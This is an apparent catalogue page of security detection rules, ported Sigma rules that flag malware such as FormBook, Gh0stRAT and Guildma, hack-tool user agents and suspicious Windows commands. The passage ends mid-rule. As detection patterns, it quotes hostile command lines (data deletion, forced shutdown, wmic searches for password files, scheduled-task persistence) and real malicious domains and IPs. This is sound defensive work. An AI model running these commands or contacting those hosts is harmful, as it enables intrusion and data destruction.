<li><a href="#">rule fireeye_red_team_tool__modified_impacket_wmiexec_via_cmdline { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects a modified implmentation of WMIEXEC by FireEye. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1047" events: (re.regex($selection1.src.process.file.full_path, `.*wmiprvse\.exe`) and re.regex($selection1.target.process.file.full_path, `.*cmd\.exe`) and re.regex($selection1.target.process.command_line, `.*cmd\.exe /Q /K .*`) and re.regex($selection1.target.process.command_line, `.*\\\\\\\\127\.0\.0\.1\\Admin$\\.*\.dat.*`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule flash_player_update_from_suspicious_location { meta: author = "Florian Roth" description = "Detects a flashplayer update from an unofficial location License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: ((re.regex($selection.target.url, `.*/install_flash_player\.exe`) or re.regex($selection.target.url, `.*/flash_install\.php.*`)) and not (re.regex($selection.target.url, `.*\.adobe\.com/.*`))) condition: $selection 
<li><a href="#">rule flawedammyy_rat_detection_proxy { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "FlawedAmmyy RAT Detection Through Proxy. License: ." reference = "" version = "0.01" created = "2018/07/11" product = "proxy" mitre = "Command and Control, t1071" events: (($selectionSRC.target.url = "chimachinenow.com" or $selectionSRC.target.url = "highlandfamily.org" or $selectionSRC.target.url = "intra.cfecgcaquitaine.com" or $selectionSRC.target.url = "motifahsap.com" or $selectionSRC.target.url = "sittalhaphedver.com" or $selectionSRC.target.url = "wassronledorhad.in" or $selectionSRC.target.url = "balzantruck.com" or $selectionSRC.target.url = "buyviagraoverthecounterusabb.net" or $selectionSRC.target.url = "fifa2018start.info" or $selectionSRC.target.url = "buyviagraoverthecounterusabb.net/documents/B123456789012.js" or $selectionSRC.target.url = "chimachinenow.com/kjdhc783" or $selectionSRC.target.url = "highlandfamily.org/kjdhc783" or $selectionSRC.target.url = "intra.cfecgcaquitaine.com/kjdhc783" or $selectionSRC.target.url = "motifahsap.com/kjdhc783" or $selectionSRC.target.url = "sittalhaphedver.com/p66/kjdhc783" or $selectionSRC.target.url = "wassronledorhad.in/q2/index.php" or $selectionSRC.target.url = "balzantruck.com/45rt.exe") or ($selectionSRC.principal.ip = "179.60.146.3" or $selectionSRC.principal.ip = "185.176.221.54" or $selectionSRC.principal.ip = "179.60.146.3" or $selectionSRC.principal.ip = "194.165.16.11") or ($selectionSRC.target.ip = "179.60.146.3" or $selectionSRC.target.ip = "185.176.221.54" or $selectionSRC.target.ip = "179.60.146.3" or $selectionSRC.target.ip = "194.165.16.11")) condition: $selectionSRC 
<li><a href="#">rule flowerpippi_malware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects charactaristics that are attributed to the Flowerpippi Malware Strain License: ." reference = "" version = "0.01" created = "2019/07/05" product = "windows" service = "sysmon" mitre = "defense_evasion, persistence, execution, privilege_escalation, t1045, t1106, t1053" events: (($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.file.full_path, `.*pes1\.exe`)) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*pes1\.exe`))) condition: $selection1 
<li><a href="#">rule formbook_malware_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "FormBook Malware Detector. License: ." reference = "" version = "0.01" created = "2019/01/10" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "d7f0f3fea2f9935c1dd7bda343ec1e3fb77457e68b16b9d51516a3d8c651d14f" or $selection.target.file.md5 = "05a945fc7a9eb4c9a4db8eb974333b3938c06d9299976075b2fc00a79cf0a129" or $selection.target.file.md5 = "91a471ba534219f05c31d204b3c5217cde7c67f70600aa3abba334888f628376" or $selection.target.file.md5 = "f7e97000615ee77093c4ec49f3cbe4b8cb3dc6feafc74ae8d59f01f05dc4280e" or $selection.target.file.md5 = "23c40f55797b07b2d9bf1e314ea928b1151af2b2e605aa520a715fe56e481528" or $selection.target.file.md5 = "1d706a3c85973fe96240a254abff52c0593b4aa0c283d3ecc28df6f8baed853b" or $selection.target.file.md5 = "e8f0136abc46b668d44586a6b5a394b470af6af8e9d91bddca4b70e3e66768d1" or $selection.target.file.md5 = "958ee876ebaab71ea2ef9fcda6a08598319578ccc1f4bd9baa3a54114b88abdc" or $selection.target.file.md5 = "b031075b8ad2558ee3ee7f0749c2b24484dd6fab7252fad71548276514b9b766" or $selection.target.file.md5 = "667cc420816fd71ae54869b4c0f05129cc5972dbc47f7a98776fc63a72d77691" or $selection.target.file.md5 = "7db8273fd25088900cffa036eb631ffcee40302dd7b33a7d4f3e653e7ab091c0" or $selection.target.file.md5 = "3efdc8b15e324cd9323cdbd34fbd19979d6eeb95fe1120ed3a95dc24fab67397" or $selection.target.file.md5 = "189e2494b19773f9b72072774891378f5809c7bfb121dcba2cee13e6f91ed619" or $selection.target.file.md5 = "bd44861de18d5bbf71d2d64e29ff9f1d8495f97f5ba0b49eacb504b3768a89bb" or $selection.target.file.md5 = "e0282f51ac3bfba5774893c8b70c31600d7e4bd7f6d7231fd33315396cd18b78" or $selection.target.file.md5 = "83fa11d8711ef22437681e09a4be500cfaf49ac7cb29837ff6a42fb46b09d789" or $selection.target.file.md5 = "14ce215b561dc43104e400c0eb877d876f6e9be77c5b2994b9b8745b2132d914" or $selection.target.file.md5 = "226d38382415b935d849539c0b6305a4259c26dfa7317b944f8498cd3e65850f" or $selection.target.file.md5 = "dd1eeb128b1d1eb40e74281aec79828d7d7179a0375bda5e85ce5fd2fac064a2" or $selection.target.file.md5 = "a7422eddb437a33d730ab70bd1267d815fc3761d5eda9781de91d0bdeeb823ff" or $selection.target.file.md5 = "2a21f728282b33b89e6cbd99db52651931b534be9837d99eacf87cfd748c3cba" or $selection.target.file.md5 = "91b6219f4a8903773492fd83fe02e6aa8729e378f559c5cc9f115a2304f89e57" or $selection.target.file.md5 = "4f73923c23354ac5050f012f607342362eaf1d691ce1b64ea1e831038cc4236c" or $selection.target.file.md5 = "ebbed2fcd7fe4dc8a95cc60ab9c8e98609bcf3ba5696507252c65cc6be748b14" or $selection.target.file.md5 = "d1f9549943b936ba54d87a5befd2d241fcddac6f0caf8c786f6034ab18b8e61d" or $selection.target.file.md5 = "ae7cacc7a16cb48cb40473ad0269331c392f8eb0fef8ebe2d90f3592fccb306c" or $selection.target.file.md5 = "00cb817330768b33a30bcf7a6a67d0269aa32f8099aee3ecd18da0e31d096610" or $selection.target.file.md5 = "e93994bf78b13d3bdee1682faf6c6544246fbd6d95a0aa043ac175ad0b905646" or $selection.target.file.md5 = "822c1239203db0bfdde3d0b65f50e53f7ee155638d4743b14f58267fa3e76531" or $selection.target.file.md5 = "5aac259cb807a4c8e4986dbc1354ef566a12ced381b702a96474c0f8ff45f825" or $selection.target.file.md5 = "8f6813634cb08d6df72e045294bf63732c0753f79293f1c9b2765f686f699a72" or $selection.target.file.md5 = "82ce499994e4b2ee46e887946ef43f18b046639e81dfe1d23537ce6a530d8794" or $selection.target.file.md5 = "4c16046966a5fd06c84213aa67bfa37949800980915e9b511384ec17dc7eb7b1" or $selection.target.file.md5 = "04f093a3b867918dce921fe2ba40dcdae769b35dbce3047aacdb151e2208ea5c" or $selection.target.file.md5 = "59cf77148cbbf24d395d09192ce43ac5395087f3e499cda350e3a93f13e37de1" or $selection.target.file.md5 = "D83f874dda2fa3e4339399c786e9497c1b440019fa5ee5925738fc3afa67352c" or $selection.target.file.md5 = "35ea3d8272751d60bd3106e548444588b1959622dfdcf11be14b80786bdb25e6" or $selection.target.file.md5 = "5e9979a9676889a6656cbfa9ddc1aab2fa4b301155f5b55377a74257c9f9f583" or $selection.target.file.md5 = "0b0615eb8e4c91983fab37475ecc374f79c394768a33ea68c2208da1c03e5a43" or $selection.target.file.md5 = "Fccc874f4f741231673f5a3c0bdc4c6bfd07f1b1e93f7c64e2015c393966216e" or $selection.target.file.md5 = "13ce56581c8ad851fc44ad6c6789829e7c250b2c8af465c4a163b9a28c9b8a41" or $selection.target.file.md5 = "541ea322a3a6385211566f95cef333580a62341dac397e044a04504625acdd0d" or $selection.target.file.md5 = "062ae7152d8e8f3abb093e55c5a90213134dd278ac28cfeb18e81132232dcbe8" or $selection.target.file.md5 = "0ddf7e87957932650679c99ff2e2380e2be8a203d1142f19a22ad602047f372e" or $selection.target.file.md5 = "1debc4e22a40f4f87142e7e40094ce1a9aa10462f0c6d1c29aa272d7d6849205" or $selection.target.file.md5 = "701b1549152e2c460c8c67008c3bcc0e" or $selection.target.file.md5 = "6badb8ff9a65ad709ef8674bb78a8ec0497de536b35fe6b8c6e6d76d17926d54")) condition: $selection 
<li><a href="#">rule gelup_malware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects charactaristics that are attributed to the Gelup Malware Strain License: ." reference = "" version = "0.01" created = "2019/07/05" product = "windows" service = "sysmon" mitre = "defense_evasion, persistence, execution, privilege_escalation, t1045, t1106, t1053" events: (($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\Windows \\System32\\propsys.dll" or $selection1.target.file.full_path = "C:\\Windows \\System32\\ComputerDefaults.exe" or re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Roaming\\MSOCache.*\.xml`) or re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Local\\Temp\\tmpaddon_bak`) or re.regex($selection1.target.file.full_path, `.*schetasks\.exe`) or $selection1.target.file.full_path = "C:\\Windows\\api.config")) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*schetasks\.exe`) and re.regex($selection1.target.process.command_line, `schetasks\.exe /create /rl highest /tn .* /sc logon /tr C:\\$Recycle\.Bin.*.*\.lnk`))) condition: $selection1 
<li><a href="#">rule gh0strat_malware_detector_sysmon_behavior_july_2019 { meta: author = "Lee Archinal" description = "This content detects characteristics of the Gh0stRAT Malware that was found in July 2019 License: ." reference = "" version = "0.01" created = "2019/08/07" product = "windows" service = "sysmon" mitre = "defense_evasion, persistence, t1112, t1060" events: (((($selection1.metadata.product_event_type = "13" and (((($selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\System Remote Data" or $selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\System Remote Data\\Parameters" or $selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\System Remote Data" or $selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SRDSL" or $selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SRDSL\\Parameters" or $selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\SRDSL") or ($selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\SRDSL" and ($selection1.metadata.description = "ImagePath" or $selection1.metadata.description = "Description" or $selection1.metadata.description = "SRDSL" or $selection1.metadata.description = "Group" or $selection1.metadata.description = "Type" or $selection1.metadata.description = "Start" or $selection1.metadata.description = "ErrorControl"))) or ($selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\SYSTEM REMOTE DATA" and ($selection1.metadata.description = "Description" or $selection1.metadata.description = "Group" or $selection1.metadata.description = "InstallTime" or $selection1.metadata.description = "Type" or $selection1.metadata.description = "Start" or $selection1.metadata.description = "ErrorControl" or $selection1.metadata.description = "ImagePath" or $selection1.metadata.description = "DisplayName" or $selection1.metadata.description = "WOW64" or $selection1.metadata.description = "ObjectName" or $selection1.metadata.description = "FailureActions"))) or ($selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\SVCHOST" and $selection1.metadata.description = "System Remote Data"))) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\SysWOW64\\System Remote Data\.exe`) or re.regex($selection1.target.file.full_path, `.*\\SysWOW64\\SRDSL\.exe`) or re.regex($selection1.target.file.full_path, `.*\\Google\\28484\.dll`) or re.regex($selection1.target.file.full_path, `.*\\SysWOW64\\System\. Remote\. Data\.\.exe`) or re.regex($selection1.target.file.full_path, `.*\\SysWOW64\\en-US\\svchost\.exe\.mui`) or re.regex($selection1.target.file.full_path, `.*\\Google\\32640\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\29703\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\661453\.dll`) or re.regex($selection1.target.file.full_path, `.*\\660125\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\638859\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\693828\.dll`) or re.regex($selection1.target.file.full_path, `.*\\StormII\\668515\.dll`) or re.regex($selection1.target.file.full_path, `.*\\33625\.dll`) or re.regex($selection1.target.file.full_path, `.*\\DRM\\32046\.dll`) or re.regex($selection1.target.file.full_path, `.*\\30421\.dll`) or re.regex($selection1.target.file.full_path, `.*\\DRM\\36265\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\32812\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\33718\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\28281\.dll`) or re.regex($selection1.target.file.full_path, `.*\\%ProgramFiles%\\33234\.dll`) or re.regex($selection1.target.file.full_path, `.*\\Google\\32250\.dll`) or re.regex($selection1.target.file.full_path, `.*\\-1672280194\.dll`) or re.regex($selection1.target.file.full_path, `.*\\SysWOW64\\System Rem2ote Data\.exe`)))) or ($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\System Remote Data\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\SysWOW64\\SRDSL\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\SysWOW64\\System\. Remote\. Data\.\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\SysWOW64\\System Rem2ote Data\.exe`)))) or ($selection1.metadata.product_event_type = "7" and (re.regex($selection1.target.process.file.full_path, `.*\\Google\\28484\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\32640\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\29703\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\661453\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\660125\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\638859\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\693828\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\StormII\\668515\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\33625\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\DRM\\32046\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\30421\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\DRM\\36265\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\32812\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\33718\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\28281\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\%ProgramFiles%\\33234\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\Google\\32250\.dll`) or re.regex($selection1.target.process.file.full_path, `.*\\-1672280194\.dll`)))) condition: $selection1 
<li><a href="#">rule godlua_malware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects charactaristics that are attributed to the Godlua Malware Strain License: ." reference = "" version = "0.01" created = "2019/07/05" product = "windows" service = "sysmon" mitre = "command_and_control, collection, t1043, t1005" events: (($selection1.metadata.product_event_type = "1" and ($selection1.target.file.md5 = "870319967dba4bd02c7a7f8be8ece84f" or $selection1.target.file.md5 = "c9b712f6c347edde22836fb43b927633" or $selection1.target.file.md5 = "75902cf93397d2e2d1797cd115f8347a") and (($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*start\.png`) or re.regex($selection1.target.file.full_path, `.*run\.png`) or re.regex($selection1.target.file.full_path, `.*quit\.png`) or re.regex($selection1.target.file.full_path, `.*watch\.png`) or re.regex($selection1.target.file.full_path, `.*upgrade\.png`) or re.regex($selection1.target.file.full_path, `.*proxy\.png`) or re.regex($selection1.target.file.full_path, `.*packet\.png`) or re.regex($selection1.target.file.full_path, `.*curl\.png`) or re.regex($selection1.target.file.full_path, `.*util\.png`) or re.regex($selection1.target.file.full_path, `.*utils\.png`) or re.regex($selection1.target.file.full_path, `.*VM\.png`) or re.regex($selection1.target.file.full_path, `.*CC\.png`))) or ($selection1.metadata.product_event_type = "3" and ($selection1.target.ip = "198.204.231.250" or $selection1.target.ip = "104.238.151.101" or $selection1.target.ip = "43.224.225.220")))) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*start\.png`) or re.regex($selection1.target.file.full_path, `.*run\.png`) or re.regex($selection1.target.file.full_path, `.*quit\.png`) or re.regex($selection1.target.file.full_path, `.*watch\.png`) or re.regex($selection1.target.file.full_path, `.*upgrade\.png`) or re.regex($selection1.target.file.full_path, `.*proxy\.png`) or re.regex($selection1.target.file.full_path, `.*packet\.png`) or re.regex($selection1.target.file.full_path, `.*curl\.png`) or re.regex($selection1.target.file.full_path, `.*util\.png`) or re.regex($selection1.target.file.full_path, `.*utils\.png`) or re.regex($selection1.target.file.full_path, `.*VM\.png`) or re.regex($selection1.target.file.full_path, `.*CC\.png`)))) condition: $selection1 
<li><a href="#">rule group_modification_logging { meta: author = "Alexandr Yampolskyi" description = "Configure systems to issue a log entry and alert when an account is added to or removed from any group assigned administrative privileges. Sigma detects Event ID 4728 indicates a â€˜Member is added to a Security Groupâ€™. Event ID 4729 indicates a â€˜Member is removed from a Security enabled-groupâ€™. Event ID 4730 indicates aâ€˜Security Group is deletedâ€™. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2 and 8.1, Windows 2016 and 10 Windows Server 2019, Windows Server 2000, Windows 2003 and XP. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "CSC4, CSC4.8, GDPR Art 32.1, GDPR Art 32.2, NIST CSF 1.1 PR.AC-4, NIST CSF 1.1 PR.AT-2, NIST CSF 1.1 PR.MA-2, NIST CSF 1.1 PR.PT-3, ISO 27002-2013 A.9.1.1, ISO 27002-2013 A.9.2.2, ISO 27002-2013 A.9.2.3, ISO 27002-2013 A.9.2.4, ISO 27002-2013 A.9.2.5, ISO 27002-2013 A.9.2.6, ISO 27002-2013 A.9.3.1, ISO 27002-2013 A.9.4.1, ISO 27002-2013 A.9.4.2, ISO 27002-2013 A.9.4.3, ISO 27002-2013 A.9.4.4, PCI DSS 3.2 2.1, PCI DSS 3.2 7.1, PCI DSS 3.2 7.2, PCI DSS 3.2 7.3, PCI DSS 3.2 8.1, PCI DSS 3.2 8.2, PCI DSS 3.2 8.3, PCI DSS 3.2 8.7" events: ($selection.metadata.product_event_type = "4728" or $selection.metadata.product_event_type = "4729" or $selection.metadata.product_event_type = "4730" or $selection.metadata.product_event_type = "633" or $selection.metadata.product_event_type = "632" or $selection.metadata.product_event_type = "634") condition: $selection 
<li><a href="#">rule guildma_malware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects characteristics of the Guildma malware strain License: ." reference = "" version = "0.01" created = "2019/07/30" product = "windows" service = "sysmon" mitre = "command_and_control, t1219, exfiltration, t1041, execution, t1059" events: (($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `C:\\Users\\Public\\Librarires\\awsvideos.*`) or re.regex($selection1.target.file.full_path, `C:\\Users \\Public\\Librarires\\awsvideos.*`) or re.regex($selection1.target.file.full_path, `C:\\Users\\Public\\Libraries\\raptor.*`) or re.regex($selection1.target.file.full_path, `.*rakpat0.*`))) or ($selection1.metadata.product_event_type = "1" and ($selection1.target.process.command_line = "cmd /k shutdown -r -t 0 -f" or $selection1.target.process.command_line = "cmd /k shutdown -r -t 1 -f" or $selection1.target.process.command_line = "taskkill /f /im regsvr32.exe" or $selection1.target.process.command_line = "taskkill /f /im unins000.exe" or $selection1.target.process.command_line = "taskkill /f /im aswRunDll.exe" or $selection1.target.process.command_line = "cmd /k del /q /s /f C:\\ProgramData\\sysdirb & exit" or $selection1.target.process.command_line = "cmd /k del /q /s /f C:\\ProgramData\\nulls & exit" or $selection1.target.process.command_line = "cmd /k del /q /s /f C:\\ProgramData\\xnull & exit" or $selection1.target.process.command_line = "cmd /k del /q /s /f C:\\ProgramData\\libs & exit" or $selection1.target.process.command_line = "cmd /k rd /s /q C:\\ProgramData\\sysdirb & exit" or $selection1.target.process.command_line = "cmd /k rd /s /q C:\\ProgramData\\nulls & exit" or $selection1.target.process.command_line = "cmd /k rd /s /q C:\\ProgramData\\xnull & exit" or $selection1.target.process.command_line = "cmd /k rd /s /q C:\\ProgramData\\libs & exit"))) condition: $selection1 
<li><a href="#">rule hack_tool_user_agent { meta: author = "Florian Roth" description = "Detects suspicious user agent strings user by hack tools in proxy logs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: (re.regex($selection.src.application, `.*\(hydra\).*`) or re.regex($selection.src.application, `.* arachni/.*`) or re.regex($selection.src.application, `.* BFAC .*`) or re.regex($selection.src.application, `.* brutus .*`) or re.regex($selection.src.application, `.* cgichk .*`) or re.regex($selection.src.application, `.*core-project/1\.0.*`) or re.regex($selection.src.application, `.* crimscanner/.*`) or re.regex($selection.src.application, `.*datacha0s.*`) or re.regex($selection.src.application, `.*dirbuster.*`) or re.regex($selection.src.application, `.*domino hunter.*`) or re.regex($selection.src.application, `.*dotdotpwn.*`) or $selection.src.application = "FHScan Core" or re.regex($selection.src.application, `.*floodgate.*`) or re.regex($selection.src.application, `.*get-minimal.*`) or re.regex($selection.src.application, `.*gootkit auto-rooter scanner.*`) or re.regex($selection.src.application, `.*grendel-scan.*`) or re.regex($selection.src.application, `.* inspath .*`) or re.regex($selection.src.application, `.*internet ninja.*`) or re.regex($selection.src.application, `.*jaascois.*`) or re.regex($selection.src.application, `.* zmeu .*`) or re.regex($selection.src.application, `.*masscan.*`) or re.regex($selection.src.application, `.* metis .*`) or re.regex($selection.src.application, `.*morfeus fucking scanner.*`) or re.regex($selection.src.application, `.*n-stealth.*`) or re.regex($selection.src.application, `.*nsauditor.*`) or re.regex($selection.src.application, `.*pmafind.*`) or re.regex($selection.src.application, `.*security scan.*`) or re.regex($selection.src.application, `.*springenwerk.*`) or re.regex($selection.src.application, `.*teh forest lobster.*`) or re.regex($selection.src.application, `.*toata dragostea.*`) or re.regex($selection.src.application, `.* vega/.*`) or re.regex($selection.src.application, `.*voideye.*`) or re.regex($selection.src.application, `.*webshag.*`) or re.regex($selection.src.application, `.*webvulnscan.*`) or re.regex($selection.src.application, `.* whcc/.*`) or re.regex($selection.src.application, `.* Havij`) or re.regex($selection.src.application, `.*absinthe.*`) or re.regex($selection.src.application, `.*bsqlbf.*`) or re.regex($selection.src.application, `.*mysqloit.*`) or re.regex($selection.src.application, `.*pangolin.*`) or re.regex($selection.src.application, `.*sql power injector.*`) or re.regex($selection.src.application, `.*sqlmap.*`) or re.regex($selection.src.application, `.*sqlninja.*`) or re.regex($selection.src.application, `.*uil2pn.*`) or $selection.src.application = "ruler" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)") condition: $selection 
<li><a href="#">rule hacktool_use { meta: author = "Florian Roth" description = "This method detects well-known keywords, certain field combination that appear in Windows Eventlog when certain hack tools are used License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "discovery, execution, t1087, t1075, t1114, t1059" events: (($selection1.metadata.product_event_type = "4776" or $selection1.metadata.product_event_type = "4624" or $selection1.metadata.product_event_type = "4625") and $selection1.principal.hostname = "RULER") condition: $selection1 
<li><a href="#">rule hawkeye_keylogger_file_creation_and_create_process_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "Detects characteristics of the Hawkeye Keylogger strain of malware License: ." reference = "" version = "0.01" created = "2019/07/15" product = "windows" service = "sysmon" mitre = "execution, t1059, t1204, Defense_evasion, t1112" events: (re.regex($selection1.target.process.file.full_path, `C:\\Windows\\Microsoft\.NET\\Framework.*\\vbc\.exe`) and (($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Local\\Temp.*\.tmp`)) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.command_line, `.* /stext \"\"C:\\Users.*\\AppData\\Local\\Temp.*\.tmp`)))) condition: $selection1 
<li><a href="#">rule hidden_cobra_fastcash_malware_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "HIDDEN COBRA FASTCash Malware Detector for Sysmon. License: ." reference = "" version = "0.01" created = "2018/10/02" product = "windows" service = "sysmon" mitre = "Execution, t1035, t1177" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "10ac312c8dd02e417dd24d53c99525c29d74dcbc84730351ad7a4e0a4b1a0eba" or $selection.target.file.md5 = "3a5ba44f140821849de2d82d5a137c3bb5a736130dddb86b296d94e6b421594c" or $selection.target.file.md5 = "4a740227eeb82c20286d9c112ef95f0c1380d0e90ffb39fc75c8456db4f60756" or $selection.target.file.md5 = "820ca1903a30516263d630c7c08f2b95f7b65dffceb21129c51c9e21cf9551c6" or $selection.target.file.md5 = "a9bc09a17d55fc790568ac864e3885434a43c33834551e027adb1896a463aafc" or $selection.target.file.md5 = "ab88f12f0a30b4601dc26dbae57646efb77d5c6382fb25522c529437e5428629" or $selection.target.file.md5 = "ca9ab48d293cc84092e8db8f0ca99cb155b30c61d32a1da7cd3687de454fe86c" or $selection.target.file.md5 = "d465637518024262c063f4a82d799a4e40ff3381014972f24ea18bc23c3b27ee" or $selection.target.file.md5 = "e03dc5f1447f243cf1f305c58d95000ef4e7dbcc5c4e91154daa5acd83fea9a8" or $selection.target.file.md5 = "f3e521996c85c0cdb2bfb3a0fd91eb03e25ba6feef2ba3a1da844f1b17278dd2" or $selection.target.file.md5 = "1f2cd2bc23556fb84a51467fedb89cbde7a5883f49e3cfd75a241a6f08a42d6d" or $selection.target.file.md5 = "9ddacbcd0700dc4b9babcd09ac1cebe23a0035099cb612e6c85ff4dffd087a26")) condition: $selection 
<li><a href="#">rule hiding_files_with_attribexe { meta: author = "Sami Ruohonen" description = "Detects usage of attrib.exe to hide files from users. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, persistence, t1158" events: ((re.regex($selection.target.process.file.full_path, `.*\\attrib\.exe`) and re.regex($selection.target.process.command_line, `.* \+h .*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.command_line, `.*\\desktop\.ini .*`) or (re.regex($selection.src.process.file.full_path, `.*\\cmd\.exe`) and re.regex($selection.target.process.command_line, `\+R \+H \+S \+A \\.*\.cui`) and re.regex($selection.src.process.command_line, `C:\\WINDOWS\\system32\\.*\.bat`))))) condition: $selection 
<li><a href="#">rule hooking_detection_sysmon { meta: author = "Roman Ranskyi" description = "Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Credential Access, t1179" events: ($selection0.metadata.product_event_type = "1" and $selection0.target.process.command_line = "/INJECTRUNNING" and $selection0.target.process.file.full_path = "mavinject.exe") condition: $selection0 
<li><a href="#">rule hostdomain_enumeration_with_wmic { meta: author = "Osman Demir" description = "Detects the Host/Domain Enumeration Attempts. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "discovery, T1082, T1083, T1087" events: (($selection.target.process.file.full_path = "cmd.exe" or $selection.target.process.file.full_path = "powershell.exe") and ($selection.target.process.command_line = "wmic os LIST Full" or $selection.target.process.command_line = "wmic computersystem LIST full" or $selection.target.process.command_line = "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct" or $selection.target.process.command_line = "wmic path Win32_PnPdevice" or $selection.target.process.command_line = "wmic qfe list brief" or re.regex($selection.target.process.command_line, `wmic DATAFILE where \"path='\\\\Users\\\\test\\\\Documents\\\\'\" GET .*`) or re.regex($selection.target.process.command_line, `wmic DATAFILE where \"drive='C:' AND Name like '%password%'\" GET .*`) or re.regex($selection.target.process.command_line, `wmic USERACCOUNT Get .*`) or $selection.target.process.command_line = "wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE" or re.regex($selection.target.process.command_line, `wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_user where .*`) or $selection.target.process.command_line = "wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_user GET ds_samaccountname" or $selection.target.process.command_line = "wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group GET ds_samaccountname" or $selection.target.process.command_line = "wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group where \"ds_samaccountname='Domain Admins'\" Get ds_member /Value" or re.regex($selection.target.process.command_line, `wmic path win32_groupuser where \(groupcomponent=\"win32_group\.name=\"domain admins\",domain .*\"\)`) or $selection.target.process.command_line = "wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_computer GET ds_samaccountname" or $selection.target.process.command_line = "wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_computer 